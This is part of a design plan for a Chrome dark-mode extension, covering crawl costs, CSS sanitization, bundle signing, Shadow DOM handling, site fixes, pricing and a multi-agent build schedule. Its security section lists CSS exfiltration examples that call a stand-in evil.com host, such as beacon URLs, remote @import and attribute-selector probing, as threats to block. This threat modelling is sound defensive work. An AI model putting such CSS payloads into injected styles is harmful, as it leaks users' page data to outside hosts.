- Only for: SPAs with JS-rendered CSS, sites needing screenshot verification, sites that failed HTTP-only classification
- Full headless Chrome with page render, CSSOM access, computed styles
- Iterative optimization for complex/heavy-app sites
- **Cost per site: ~$0.001-0.01**

**Preset multiplication at build time, not crawl time**: Crawl each site once, extract CSS structure and color values. Apply preset color transformations at **publish time** (fast CPU-only job, no Playwright). This avoids multiplying crawl costs by 5-10x.

### Cost Projections

**Phase 0-1 (Top 1K sites): Near-Zero**

| Approach | Cost | Notes |
|----------|------|-------|
| GitHub Actions free tier | $0 | 1K sites × 30s avg = 500 min, within free tier |
| Local machine (M-series Mac) | $0 | 4 Playwright instances in parallel, ~2 hours |
| Oracle Cloud free tier | $0 | 4 Arm cores, 24GB RAM, genuinely free forever |

**Phase 2-3 (Top 100K sites): $20-200/month**

| Component | Tiered Approach | Full Playwright (avoid) |
|-----------|----------------|------------------------|
| HTTP-only crawl (90K sites) | ~$5/mo (GitHub Actions) | N/A |
| Playwright crawl (10K sites) | ~$15-50/mo (Hetzner CX22 @ $4/mo or spot instances) | ~$500-1K/mo |
| Bandwidth | ~$10-20/mo | ~$50-100/mo |
| R2 storage | $0.36/mo | $3.60/mo |
| R2 egress (CDN) | Free | Free |
| Preset transform (build-time) | ~$5-10/mo | ~$500-2K/mo if crawled per-preset |
| **Total** | **~$35-85/mo** | **~$1,000-3,000/mo** |

**Phase 4 (Top 1M sites): $100-400/month**
- 900K sites via HTTP-only: ~$20-50/mo
- 100K sites via Playwright (incremental re-crawl of changed sites): ~$50-200/mo
- Preset transforms + publish: ~$20-50/mo
- Anti-bot residential proxies for blocked sites: ~$50-100/mo (only for sites that block; estimated 20-35% failure rate on enterprise anti-bot)

At 2% conversion of 100K users at $30/yr = $60K/yr revenue, even the Playwright-heavy approach costs <5% of revenue. With tiered crawling, it's <2%.

### Crowdsourced Quality (Replaces ML Classifier)

Instead of an expensive ML quality gate, crowdsource quality data from users:

1. **"Report broken site" button** in popup/side panel — sends `{ domain, preset }` to API (opt-in only)
2. **Auto-signal**: If user toggles dark mode off within 10 seconds of page load, flag as potentially broken (local-only unless opted in)
3. **User ratings**: After 5 page views on a site, optional 1-5 star rating prompt (non-intrusive, dismissible)
4. **Prioritized re-crawl**: Reported domains get bumped to the top of the next crawl cycle
- **Zero compute cost, more accurate than ML, and creates a user feedback loop**

### Competitive Moat

The override database itself isn't a moat — anyone could crawl the same sites. The moat is the **intelligence layer**:

1. **Site-style analysis engine**: Automated classification of every site's dark mode status, complexity, and optimal strategy. This is trained knowledge — which sites are permanently dark, which have native toggles, which need full overrides — that compounds over time
2. **Iterative quality optimization**: Playwright workers that don't just transform CSS but visually verify the result, iterate, and refine. The output quality is fundamentally higher than a single-pass transform
3. **Quality corpus**: Thousands of hours of automated + manual QA, confidence scores, per-element exception rules, image analysis data
4. **Freshness pipeline**: Continuous re-crawling, reclassification (sites add/remove native dark mode), user feedback signals, staleness detection
5. **Preset multiplication**: Each site × each preset = 10× more computed overrides than a generic dark mode. The iterative optimization runs per-preset, not just once
6. **Historical data**: Knowing which CSS rules are stable vs volatile per domain, tracking when sites add native dark mode, learning which patterns produce good results
7. **Network effects**: More users → more freshness signals → more breakage reports → better classification → more users

Dark Reader processes every page from scratch on every visit — no memory, no classification, no iterative quality improvement. Night Eye manually curates ~1,500 sites. Our engine autonomously analyzes, classifies, and optimizes 100K+ sites with visual verification.

---

## 7. Security & Privacy Architecture

### CSS Sanitization Pipeline (REQUIRED)

Every CSS override bundle — whether from the crawl pipeline CDN or the local dynamic engine — must pass through a strict sanitization pipeline before injection. CSS injected at `document_start` on `<all_urls>` runs on banking sites, email, medical portals, and government services. A malicious CSS rule can exfiltrate data without JavaScript:

**Attack vectors blocked:**
- `background-image: url('https://evil.com/track?...')` — beacon tracking
- `@import url('https://evil.com/payload.css')` — dynamic payload delivery
- `@font-face { src: url('...'); unicode-range: U+0041 }` — character probing
- `input[value^="a"] { background: url('...') }` — attribute selector data extraction
- `cursor: url('...')` — cursor image tracking

**Sanitization rules (enforced at both build time and injection time):**

| Rule | Action |
|------|--------|
| `url()` with `http://` or `https://` | **Block** — allow only `data:` URIs |
| `@import` | **Block entirely** — `adoptedStyleSheets` blocks this by design |
| `@font-face` with external `src` | **Block** |
| `image-set()` with external URLs | **Block** |
| Property allowlist | Only color/layout properties: `color`, `background-color`, `border-color`, `fill`, `stroke`, `opacity`, `filter`, `mix-blend-mode`, `box-shadow`, `text-shadow`, `outline-color`, `caret-color`, `scrollbar-color` |

**Defense in depth:**
1. Build-time sanitization during crawl pipeline publishing
2. Ed25519 signature verification before injection (see below)
3. `adoptedStyleSheets` injection (blocks `@import` by design)
4. Client-side CSS property allowlist check (catches sanitizer bypasses)
5. Same sanitization applied to dynamically computed CSS before IndexedDB caching

### Cryptographic Bundle Signing

Every override bundle published to R2 CDN is signed to prevent supply chain attacks:

```
Build pipeline:
  CSS bundle → SHA-256 hash → Ed25519 sign(hash, private_key)
  Store { bundle, signature, hash } in R2

Extension (at injection time):
  Fetch { bundle, signature, hash }
  Verify: Ed25519 verify(hash, signature, embedded_public_key)
  If valid → sanitize → inject
  If invalid → discard, fall back to dynamic pipeline, log warning
```

- **Private key**: Stored in secrets manager (never in repo or CI environment)
- **Public key**: Embedded in extension source code
- **Manifest signing**: The CDN manifest itself is signed — prevents attackers from pointing domain entries to malicious bundles even if individual bundles are signed
- **R2 bucket controls**: Write access only from CI/CD service account, object versioning enabled, audit logs for all writes

### Privacy-Safe Domain Reporting

The "report unrecognized domain" feature (Section 6) must be **strictly opt-in** with privacy protections:

1. **Default: OFF** — explicit toggle in settings: "Help improve Browse Darkly by reporting unrecognized sites"
2. **k-anonymity**: Only process a domain report if ≥50 users report the same domain. Individual reports below threshold are discarded server-side
3. **Data minimization**: Reports contain ONLY the domain string. No timestamp, no user agent, no IP (Cloudflare Worker strips client IP), no extension ID, no session ID
4. **No URL paths**: Only `example.com`, never `example.com/private-page`
5. **Batched + delayed**: Queue reports locally, submit weekly in randomized-order batches (removes timing correlation)
6. **Documented**: Disclosed in CWS privacy practices, extension privacy policy, and in-extension consent prompt
7. **GDPR compliant**: Lawful basis is explicit consent (not legitimate interest). Right to erasure: user can disable reporting and all queued reports are purged locally

### CWS Review Strategy

Dark Reader and Night Eye both use `<all_urls>` / `*://*/*` and are approved. The dark mode category is well-established on CWS. Key strategies:

- **Budget 1-2 weeks** for initial CWS review (broad host permissions trigger manual review)
- **Submit early** to start the review clock — even with a minimal feature set
- **Permission justification**: "Broad host access is required to read and modify CSS styling of all webpages to apply dark theme transformations universally"
- **Minimal required permissions**: `sidePanel`, `storage`, `alarms`, `activeTab`, `scripting`
- **Optional permissions**: `identity`, `identity.email` (requested at runtime when user clicks "Sign in")
- **No `tabs` permission**: `activeTab` is sufficient; `tabs` exposes full URLs of all open tabs
- **No `chrome.debugger`**: Removed entirely — use CSS `color-scheme` injection + page-world `matchMedia` override instead
- **Clean privacy policy**: Zero telemetry, local-only storage, opt-in domain reporting

---

## 8. Shadow DOM Strategy

### The Problem

Shadow DOM creates isolated style boundaries that external CSS cannot penetrate. Major sites using Shadow DOM: YouTube (200-500+ shadow roots via Polymer), Reddit (100-300+ via `shreddit-*` elements), Salesforce Lightning (500-1000+). The trend is accelerating with Declarative Shadow DOM now supported in all browsers.

### CSS Variable Inheritance (The Fast Path)

CSS custom properties (`--*`) inherit through shadow boundaries **by design**. This is Browse Darkly's biggest architectural advantage for Shadow DOM sites:

```css
/* Override on :root — automatically cascades into ALL shadow roots */
:root {
  --site-bg: #1a1a2e;
  --site-text: #e0e0e0;
  --site-border: #2d2d44;
}
```

For sites that use CSS variables for colors (YouTube, Reddit, many framework-based sites), overriding `:root` variables themes the entire page — including shadow DOM content — with zero per-shadow-root work.

However, `background-color` does NOT inherit through shadow boundaries. For shadow roots that set their own background, we must inject an adopted stylesheet into each root.

### Adopted Stylesheet Injection

```javascript
// Create a shared CSSStyleSheet — parsed once, shared across all shadow roots
const darkSheet = new CSSStyleSheet();
darkSheet.replaceSync(`
  :host { background-color: var(--bd-bg) !important; color: var(--bd-text) !important; }
`);

// Inject into a shadow root
shadowRoot.adoptedStyleSheets = [...shadowRoot.adoptedStyleSheets, darkSheet];
```

**Performance**: One `CSSStyleSheet` object shared across hundreds of shadow roots is 10-40x faster than creating `<style>` elements in each root. For YouTube-scale pages (500 shadow roots), estimated overhead: ~30-130ms with shared sheets vs ~275-1100ms with `<style>` injection.

### Accessing Closed Shadow DOM

Chrome extensions can access closed shadow roots via `chrome.dom.openOrClosedShadowRoot(element)` (Chrome 88+). For dynamically created roots, the page-world script (`pageWorld.js`) monkey-patches `Element.prototype.attachShadow` to intercept creation and store references in a `WeakMap`.

### Shadow Root Discovery

`MutationObserver` does NOT detect shadow root creation. Three-pronged strategy:

1. **`attachShadow` proxy** (page-world): Intercepts all imperative shadow root creation
2. **`MutationObserver` + shadow root checks**: When new nodes are added to the document, check each for existing shadow roots
3. **`TreeWalker` scan**: Initial page scan for Declarative Shadow DOM (`<template shadowrootmode="open">`)

### CSS `@layer` Inside Shadow DOM

`@layer` works inside adopted stylesheets within shadow roots, but layer identifiers do NOT cross shadow boundaries. Browse Darkly uses layers to organize its overrides within each shadow root independently:
- `@layer bd-base` — inherited CSS variable values
- `@layer bd-site-fix` — site-specific overrides
- `@layer bd-user` — user customizations

---

## 9. Site-Fix System

### Learning from Dark Reader's 10+ Years

Dark Reader maintains **2,663 site-specific fix blocks** across 702 KB of configuration (37,442 lines). Their fix system addresses 5 fundamental categories of dark mode breakage:

| Directive | Usage | Purpose |
|-----------|:-----:|---------|
| **INVERT** | 49.7% | Re-invert dark elements on dark backgrounds (logos, icons with transparent bg) |
| **CSS** | 40.7% | Custom CSS rules for wrong colors the algorithm doesn't catch |
| **IGNORE INLINE STYLE** | 5.6% | Skip inline style analysis for JS-heavy elements (rich editors, color pickers) |
| **IGNORE IMAGE ANALYSIS** | 3.9% | Prevent background image processing for specific elements |
| **IGNORE CSS URL** | <0.1% | Exclude external stylesheets from processing |

### Browse Darkly's Fix System

We implement equivalent mechanisms from day one, with improvements:

**Fix directive format** (human-editable, programmatically parseable, loadable at runtime):
```
--------------------------------
example.com

SKIP                          # Already-dark site — do nothing
DEFER                         # Has native dark mode — activate it
DEFER_HINT set [data-theme="dark"] on <html>

INVERT
.logo-icon
img.dark-on-dark

CSS
.header { background-color: var(--bd-bg) !important; }
.footer { color: var(--bd-text) !important; }

IGNORE_INLINE_STYLE
.rich-text-editor
.color-picker

IGNORE_IMAGE
.brand-logo
```

**Additional directives beyond Dark Reader:**
- `SKIP` — permanently dark site, skip entirely
- `DEFER` / `DEFER_HINT` — has native dark mode, activate it with optional activation hint
- `SHADOW_ROOT_INJECT` — specify selectors for shadow roots that need direct stylesheet injection
- `PRESET_ADJUST` — per-site preset color tweaks (e.g., "on github.com, Nord preset uses #1d2230 for bg instead of default")

### Remote Fix Distribution

Dark Reader attempted to sync fixes via GitHub but was blocked ("GitHub does not allow using GitHub as a CDN"). Browse Darkly uses Cloudflare R2 + Workers:

- Fixes are versioned and published to R2 alongside override bundles
- Extension checks for fix updates on a 24-hour cadence (or on user request)
- New fixes ship without requiring a CWS extension update (critical for rapid response to site breakage)
- Fix updates are Ed25519-signed (same as override bundles)

### Google Workspace: Our Competitive Advantage

Google Workspace is Dark Reader's biggest pain point (169 combined GitHub issues for Gmail/Docs/Sheets). Browse Darkly has existing deep expertise:

| Product | Dark Reader | Browse Darkly |
|---------|-------------|---------------|
| Gmail | ~100 lines of fragile selector-based fixes | Full InboxSDK integration via existing `@darkly/site-gmail` |
| Google Docs | Inverts entire `<canvas>` — breaks user colors | Kix canvas-aware theming via existing `@darkly/site-docs` |
| Google Sheets | No dedicated fixes | Waffle grid-aware theming via existing `@darkly/site-sheets` |

When both Browse Darkly and a Darkly Suite extension are installed, Browse Darkly defers to the site-specific extension on Google Workspace domains via `claimPage()` conflict detection.

### Most Common Breakage Patterns (Prioritized for Day-One Handling)

| Pattern | Frequency | Mitigation |
|---------|-----------|------------|
| Canvas elements (Google Docs, charts) | Very high | Detect canvas-heavy sites, defer to native or skip canvas elements |
| Shadow DOM encapsulation | High (growing) | Shadow root discovery + adopted stylesheet injection (Section 8) |
| CSS `background-image` not un-inverted | High | Target `[style*="background-image"]` and elements with computed `background-image` |
| Inline styles from JS frameworks | High | `IGNORE_INLINE_STYLE` directive + debounced MutationObserver |
| Obfuscated class names (Gmail, etc.) | High | Structural selectors, InboxSDK, avoid brittle class-name fixes |
| Cross-origin iframes | Medium | Cannot style; accept limitation, log warning |
| Already-dark sites double-inverted | Medium | Dark site detection (Section 6) + 1,282-domain bootstrap list |
| `position: fixed` stacking context | Medium | Avoid filter on `<html>` when possible; use `adoptedStyleSheets` override approach |
| CSS-in-JS / hashed class names | Medium | Style-based selectors (`[style*="color"]`) instead of class-based |
| Dynamic content flash (FOLC) | Medium | Debounced observation + CPU budget limits per page |

---

## 10. Extension Architecture

### Package Structure

```
packages/
  core/                    @darkly/core (existing — reuse ThemeEngine, presets, storage, payment)
  site-generic/            @darkly/site-generic — NEW: generic dark mode engine
  browse-darkly/           browse-darkly extension — NEW
  landing-browse/          browsedarkly.com landing page — NEW
```

### Extension Manifest (Browse Darkly)

```json
{
  "manifest_version": 3,
  "name": "Browse Darkly",
  "permissions": ["sidePanel", "storage", "alarms", "activeTab", "scripting"],
  "optional_permissions": ["identity", "identity.email"],
  "action": {
    "default_popup": "popup.html"
  },
  "side_panel": {
    "default_path": "sidepanel.html"
  },
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "css": ["themes.css"],
      "js": ["content.js"],
      "run_at": "document_start"
    },
    {
      "matches": ["<all_urls>"],
      "js": ["pageWorld.js"],
      "run_at": "document_start",
      "world": "MAIN"
    }
  ],
  "commands": {
    "toggle-dark-mode": {
      "suggested_key": { "default": "Alt+Shift+D" },
      "description": "Toggle dark mode"
    }
  }
}
```

**Permission decisions:**
- **`tabs` removed**: `activeTab` is sufficient for reading the current domain. Tab switch detection uses `chrome.tabs.onActivated` + `chrome.tabs.get(tabId)` without the `tabs` permission (which would expose full URLs of ALL open tabs)
- **`identity` + `identity.email` → optional**: Requested only when user clicks "Sign in" or "Manage subscription." Reduces install-time permission prompt and CWS review scrutiny
- **`scripting` added**: Needed for `chrome.scripting.insertCSS()` with `origin: 'USER'` (user-agent priority)
- **Page-world content script**: Injects `pageWorld.js` in `MAIN` world to monkey-patch `attachShadow`, `matchMedia`, and `CSSStyleSheet` prototype (same pattern as existing Darkly Suite extensions)
- **Keyboard shortcut**: `Alt+Shift+D` for global dark mode toggle (matches common dark mode extension convention)

### UI Architecture: Popup + Side Panel Hybrid

**Popup** (toolbar click — quick actions):
- Toggle dark/light for current site
- Current preset name & small preview
- "Open Full Settings" button → opens side panel

**Side Panel** (full settings — persistent, survives tab switches):
- Preset gallery with live preview cards
- Per-site settings for current domain (context-aware — updates on tab switch via `chrome.tabs.onActivated`)
- Domain allowlist/blocklist management
- Schedule configuration (time-based + sunrise/sunset)
- System theme sync toggle
- Import/export settings
- Account/license management (uses optional `identity` permission)
- "Report broken site" feedback button (opt-in, see Section 7)
- "Powered by Darkly Suite" upsell for Google Workspace features

**Side Panel Communication:**
- **Live preview**: Side panel writes to `chrome.storage.sync` → content script's `PreferencesManager.onChange()` fires → `engine.applyPreset()` updates instantly (same pattern as existing Darkly Suite settings modal)
- **Low-latency preview**: For slider adjustments, side panel uses `chrome.tabs.sendMessage(tabId, { type: 'previewPreset', preset })` directly — no storage write overhead
- **Tab context**: Single global panel that updates via `chrome.tabs.onActivated` listener (not per-tab instances)
- **Visibility gotcha**: Register `chrome.storage.onChanged` listener at module scope (not inside React hook) to avoid missing events when panel is hidden — `requestAnimationFrame` pauses for hidden documents

### Storage Architecture

```
chrome.storage.sync (100KB max, 512 items):
  bd_preferences          — global defaults (mode, preset, schedule)
  bd_token                — payment token

chrome.storage.local (10MB max):
  bd_pro_cache            — payment status cache (30-min TTL)
  bd_domain_overrides     — { "github.com": { preset: "monokai" }, "reddit.com": { preset: "catppuccin" }, ... }
  bd_blocklist            — ["already-dark-site.com", ...]
  bd_allowlist            — ["force-darkmode-site.com", ...]
```

### Reusable from Existing Codebase
- `ThemeEngine` (`core/src/theme/engine.ts`) — fully generic
- `presets.ts` — all 5 presets + add more
- `transitions.ts` — fade-to-black overlay
- `detector.ts` — system theme detection
- `scheduler.ts` — time-based + sunrise/sunset
- `sun-times.ts` — geolocation-based sunrise/sunset
- `preferences.ts` — Chrome storage wrapper (needs per-domain extension)
- `client.ts` — payment/licensing client
- `checkout-poller.ts` — Stripe checkout flow
- `conflict-detection.ts` — page claiming
- `DarklyProvider` / `usePrefix()` — React context
- Settings UI components — modal, mini panel, paywall
- Stripe infrastructure — checkout, webhooks, D1 licensing

### New Code Needed
- `site-generic/` — generic dark mode CSS + optional site fixes
- `browse-darkly/` — extension shell (manifest, webpack, entry points)
- `browse-darkly/src/sidepanel.tsx` — React side panel app
- `browse-darkly/src/popup.tsx` — React popup (quick toggle)
- `landing-browse/` — browsedarkly.com (can fork from `landing-suite/`)
- Per-domain preference storage layer
- Dark site detection algorithm
- Domain allowlist/blocklist management UI

---

## 11. Pricing

| Plan | Price | Features |
|------|-------|----------|
| **Free** | $0 | Dark mode on all sites, 2 presets (Default + Nord), basic toggle |
| **Pro Monthly** | $4.99/mo | All presets, per-site memory, schedule/sunrise-sunset, side panel UI |
| **Pro Yearly** | $29.99/yr (~$2.50/mo) | Same as monthly, 50% savings |
| **Lifetime** | $79.99 | All Pro features, forever |
| **Bundle** (future) | TBD | Browse Darkly Pro + Darkly Suite |

Free tier drives 5-7x installation multiplier. Target 2-3% conversion.

Projected at 100K free users, 2% conversion, $30/yr = **$60K/yr revenue**.

---

## 12. Build Phases & Multi-Agent Implementation

### Agent Setup

4 clones available: `darkly-suite-0` through `darkly-suite-3`. Each agent works in its own clone. Strict file ownership per agent prevents merge conflicts.

### Dependency Graph

```
Phase 1 (Foundation) -- ALL AGENTS IN PARALLEL
------------------------------------------------
Agent-0: Core types + extension shell
Agent-1: site-generic engine (filter + CSS var fast path + dark detection)
Agent-2: Per-domain preferences + site-fix system
Agent-3: Popup UI + pageWorld.js + keyboard shortcut
    |
    v  (all Phase 1 PRs merged)
    |
Phase 2 (Full Engine) -- ALL AGENTS IN PARALLEL
------------------------------------------------
Agent-0: Dynamic theme engine (Web Worker + CSSOM serialization + color transform)
Agent-1: Shadow DOM strategy (discovery + adopted stylesheet injection)
Agent-2: Side panel UI (preset gallery, per-site settings, schedule, blocklist)
Agent-3: CSS sanitization pipeline + bundle signing infrastructure
    |
    v  (all Phase 2 PRs merged)
    |
Phase 3 (Premium + Override DB) -- ALL AGENTS IN PARALLEL
----------------------------------------------------------
Agent-0: Payment integration (Stripe product, D1 migration, Free/Pro gating)
Agent-1: Crawl pipeline (separate repo: darkly-crawler) + HTTP-only analyzer
Agent-2: Landing page (browsedarkly.com, fork from landing-suite)
Agent-3: Override DB integration (bundled overrides, CDN manifest, freshness checking)
    |
    v  (all Phase 3 PRs merged)
    |
Phase 4 (Launch) -- ALL AGENTS IN PARALLEL
-------------------------------------------
Agent-0: CWS submission + review response
Agent-1: Crawl top 1K sites, generate bundled overrides for top 500
Agent-2: Landing page deploy + DNS + SSL
Agent-3: Darkly Suite bundle conflict detection + upsell integration
```

### Phase 1: Foundation

**Goal**: Working extension that applies dark mode to all sites via filter + CSS variable fast path, with presets, per-domain memory, and dark site detection.

| Agent | Work | Files Owned | Dependencies |
|-------|------|-------------|--------------|
| **Agent-0** | Core types + extension shell | `core/src/config.ts` (add `'browse'` ProductId, `'bd'` prefix), `packages/browse-darkly/**` (manifest, webpack, darkly.config.ts, background.ts, content.ts), root `package.json` (add `dev:browse`), `pnpm-workspace.yaml` | None — goes first, creates package stubs for others |
| **Agent-1** | site-generic engine | `packages/site-generic/**` (filter engine, CSS variable fast path, dark site detection, image un-inversion, override CSS) | None — new package |
| **Agent-2** | Per-domain preferences + site-fix system | `core/src/storage/domain-preferences.ts`, `core/src/site-fixes/` (fix parser, fix loader, remote update client) | None — new files in core |
| **Agent-3** | Popup UI + pageWorld.js + shortcuts | `browse-darkly/src/popup.tsx`, `browse-darkly/src/popup.html`, `browse-darkly/src/pageWorld.ts` (attachShadow proxy, matchMedia override, CSSStyleSheet proxy), keyboard shortcut handler | Agent-0's shell must exist (can branch from Agent-0's PR) |

### Phase 2: Full Engine

**Goal**: Production-quality dynamic theme engine with Web Worker, Shadow DOM support, side panel UI, and security infrastructure.

| Agent | Work | Files Owned |
|-------|------|-------------|
| **Agent-0** | Dynamic theme engine | `site-generic/src/dynamic/` (CSSOM serializer, Web Worker, color transformer, adoptedStyleSheets injector, TransitionManager integration) |
| **Agent-1** | Shadow DOM strategy | `site-generic/src/shadow/` (shadow root discovery, closed root access, shared stylesheet injection, MutationObserver per-root, viewport-aware lazy processing) |
| **Agent-2** | Side panel UI | `browse-darkly/src/sidepanel.tsx`, `browse-darkly/src/sidepanel.html`, `browse-darkly/src/components/` (PresetGallery, DomainSettings, ScheduleConfig, BlocklistManager, AccountPanel) |
| **Agent-3** | Security infrastructure | `core/src/security/` (CSS sanitizer, property allowlist, Ed25519 signature verifier), `browse-darkly/src/override-loader.ts` (signed bundle verification, sanitization before injection) |

### Phase 3: Premium + Override Database

**Goal**: Payment integration, landing page, crawl pipeline (separate repo), and override database integration in the extension.

| Agent | Work | Files Owned |
|-------|------|-------------|
| **Agent-0** | Payment integration | Stripe CLI: create Browse Darkly product + 3 prices. D1 migration for `browse` product. `wrangler.toml` Stripe price vars. `browse-darkly/src/paywall.ts` (Free/Pro gating) |
| **Agent-1** | Crawl pipeline (NEW REPO: `darkly-crawler`) | Crawlee + Playwright project. HTTP-only Tier A crawler. Playwright Tier B crawler. CSS extraction + classification. Site analysis engine. R2 publishing. GitHub Actions workflow |
| **Agent-2** | Landing page | `packages/landing-browse/` (fork `landing-suite`, strip Google Workspace content, redesign hero, Browse Darkly pricing, browsedarkly.com Cloudflare Pages setup) |
| **Agent-3** | Override DB integration | `browse-darkly/src/override-db/` (bundled override loader, CDN manifest fetcher, freshness checker, confidence scoring, dynamic fallback, IndexedDB cache layer) |

### Phase 4: Launch

**Goal**: CWS submission, crawl first 1K sites, deploy landing page, wire Darkly Suite conflict detection.

| Agent | Work |
|-------|------|
| **Agent-0** | CWS submission (listing assets, privacy policy, permission justification). Respond to reviewer feedback. |
| **Agent-1** | Crawl top 1K sites via `darkly-crawler`. Generate override bundles. Publish to R2. Create bundled top-500 override package for extension. |
| **Agent-2** | Deploy `landing-browse` to Cloudflare Pages. DNS setup for browsedarkly.com. SSL. Verify Stripe checkout flow end-to-end. |
| **Agent-3** | Wire conflict detection between Browse Darkly and Darkly Suite extensions on Google Workspace domains. Add "Powered by Darkly Suite" upsell in side panel. Import/export settings feature. |

### File Ownership Rules (Conflict Avoidance)

| Conflict-Prone File | Owner | Others Wait For |
|---------------------|-------|-----------------|
| `core/src/config.ts` | Agent-0 (Phase 1) | Phase 1 PR merge |
| `pnpm-workspace.yaml` | Agent-0 (Phase 1) | Phase 1 PR merge |
| Root `package.json` | Agent-0 (Phase 1) | Phase 1 PR merge |
| `wrangler.toml` | Agent-0 (Phase 3) | Phase 3 PR merge |

### Crawler Repo Architecture

The crawl pipeline lives in a **separate repository** (`darkly-crawler`):

```
darkly-crawler/
├── src/
│   ├── crawler/           # Crawlee + Playwright site crawler
│   │   ├── tier-a.ts      # HTTP-only crawler (90% of sites)
│   │   └── tier-b.ts      # Playwright crawler (10% of sites)
│   ├── analyzer/           # CSS extraction, complexity classification
│   │   ├── dark-detection.ts
│   │   ├── css-var-extractor.ts
│   │   └── complexity-scorer.ts
│   ├── transformer/        # Color transformation (TypeScript, same code as extension)
│   ├── quality/            # Screenshot diff, contrast audit (axe-core)
│   ├── publisher/          # R2 upload, manifest generation, Ed25519 signing
│   └── scheduler/          # Orchestration, priority queue, re-crawl cadence
├── data/
│   ├── site-lists/         # Tranco/CrUX top-N lists
│   ├── dark-sites.txt      # Known dark sites (bootstrap from Dark Reader's 1,282)
│   └── site-fixes/         # Generated fix directives
├── .github/workflows/
│   ├── crawl-weekly.yml    # Scheduled crawl of changed sites
│   └── crawl-full.yml      # Monthly full re-crawl
└── package.json
```

**Why separate**: Different tech stack (Crawlee/Playwright vs Chrome extension/React/Webpack), different deployment (GitHub Actions schedules vs CWS), and Playwright + Chromium deps would bloat the monorepo's `pnpm install`.

### Firefox Portability

Chrome-only for all phases. However, design `site-generic` with no Chrome-specific APIs in the core engine:
- Color transformation: pure TypeScript, no browser APIs
- CSS injection: abstracted behind an interface (`injectStylesheet(css)`) with Chrome implementation (`adoptedStyleSheets`) and future Firefox implementation (`<style>` injection or `browser.tabs.insertCSS`)
- Storage: abstracted behind `PreferencesManager` (already done in `@darkly/core`)
- Shadow DOM: `chrome.dom.openOrClosedShadowRoot` is Chrome-only; Firefox has `element.openOrClosedShadowRoot` — handle at the adapter level

---

## 13. Open Questions (Updated)

**Resolved:**
- ~~Should Browse Darkly be part of the darkly-suite monorepo?~~ **Yes** — extension and landing page in monorepo, crawler in separate repo
- ~~What's the conflict detection strategy?~~ **Browse Darkly defers to Darkly Suite on Google Workspace domains** via `claimPage()` (Section 9)
- ~~Chrome-only or Firefox?~~ **Chrome-only initially**, but `site-generic` engine designed with no Chrome-specific APIs in core (Section 12)
- ~~Should we use WASM?~~ **No** — TypeScript + Web Worker is sufficient (Section 5)
- ~~Do we need a side panel POC?~~ **No** — zero theoretical unknowns, build the real thing in Phase 2

**Still Open:**
- Should Browse Darkly share the same Stripe account / D1 database as Darkly Suite, or create separate infrastructure?
- Should the free tier have a site limit (like Night Eye's 5-site free tier) or be truly unlimited?
- Should the keyboard shortcut (`Alt+Shift+D`) conflict-check with Dark Reader's shortcut if both are installed?
- What is the strategy for sites behind authentication (dashboards, admin panels) that the crawler cannot access?
- Should Browse Darkly support user-submitted site fixes (community-contributed, like Dark Reader's open-source config)?

---

## 14. Competitive Feature Matrix

| Feature | Dark Reader | Night Eye | Browse Darkly (Planned) |
|---------|:-----------:|:---------:|:-----------------------:|
| Basic dark mode for all sites | Yes (free) | Yes (5 sites free) | Yes (free) |
| Unlimited sites | Yes | Paid only | Yes (free) |
| Color presets (Nord, Solarized, etc.) | No — sliders only | No | Yes — 10+ curated presets |
| Per-site theme memory | On/off only | Basic customization | Full preset per domain |
| Schedule / auto dark mode | Yes (time-based) | No | Yes (time + sunrise/sunset) |
| Native side panel UI | No (popup only) | No (popup only) | Yes — persistent, spacious |
| Account / license portal | No | Basic | Full (Stripe + Google OAuth) |
| Pre-computed site overrides | No — processes from scratch every visit | ~1,500 manually curated | 100K+ sites, automated pipeline |
| Smart dark mode detection | Static list (1,026 sites) | No | Algorithmic detection + native dark mode deferral |
| Google Workspace deep integration | Generic only | Generic only | Premium: hand-tuned Gmail/Sheets/Docs |
| Performance impact | Heavy (55% slowdown) | Moderate | Lightweight (CSS variable injection) |
| Privacy / zero telemetry | Contradictory claims | Unknown | Zero telemetry, local-only storage |
| Open source | Yes | No | No (but auditable permissions) |
| Cross-browser | Chrome, Firefox, Edge, Safari | Chrome, Firefox, Edge, Safari, Opera | Chrome initially |
| Annual price | Free / $9.99 corporate | $9/year | Free tier + $29.99/year |
| Lifetime option | No | $40 | $79.99 |

---

## Sources

### Competitive & Market
- [Dark Reader GitHub](https://github.com/darkreader/darkreader) — MIT, 10M+ users
- [Night Eye Pricing](https://nighteye.app/plans-and-pricing/) — $9/yr Pro, $40 lifetime
- [Dark Reader v5 Paid Discussion](https://github.com/darkreader/darkreader/discussions/9297) — 71% against
- [Dark Reader Performance](https://github.com/darkreader/darkreader/issues/14233) — 55% Speedometer slowdown
- [Dark Mode Statistics](https://forms.app/en/blog/dark-mode-statistics) — 82% mobile, 35% browser
- [ExtensionPay Revenue Data](https://extensionpay.com/articles/browser-extensions-make-money)
- [Browser Extension Pricing](https://www.getmonetizely.com/articles/browser-extension-monetization-strategic-pricing-for-utility-tools)

### Dark Reader Site Fixes
- [Dark Reader dynamic-theme-fixes.config](https://github.com/darkreader/darkreader/blob/main/src/config/dynamic-theme-fixes.config) — 2,663 site blocks, 702 KB
- [Dark Reader dark-sites.config](https://github.com/darkreader/darkreader/blob/main/src/config/dark-sites.config) — 1,282 known dark domains
- [Dark Reader Broken Website Issues](https://github.com/darkreader/darkreader/issues?q=label%3A%22Broken+Website%22) — 608 open issues
- [Dark Reader ReDoS vulnerability](https://github.com/darkreader/darkreader/issues/12848) — malicious CSS can lock tabs at 100% CPU

### Chrome Extension APIs
- [Chrome Side Panel API](https://developer.chrome.com/docs/extensions/reference/api/sidePanel) — Chrome 114+
- [Chrome Web Store Review Process](https://developer.chrome.com/docs/webstore/review-process)
- [CWS Program Policies](https://developer.chrome.com/docs/webstore/program-policies)
- [adoptedStyleSheets Browser Support](https://caniuse.com/mdn-api_document_adoptedstylesheets) — 94.85% global
- [Chrome Extension Message Passing](https://developer.chrome.com/docs/extensions/develop/concepts/messaging)

### Filter Inversion Quality
- [Hue-Preserving Invert CSS Filter](https://monochrome.sutic.nu/2024/02/25/hue-preserving-invert-css-filter-for-dark-mode.html) — YUV color space approach
- [W3C FXTF Issue #420: hue-rotate() Accuracy](https://github.com/w3c/fxtf-drafts/issues/420)
- [GOV.UK Chrome Auto Dark Mode Assessment](https://github.com/alphagov/govuk-frontend/issues/2582) — WCAG contrast failures documented
- [Dark Reader Filter Mode Blog](https://darkreader.org/blog/filter-mode/) — explicitly positioned as fallback

### Performance & Architecture
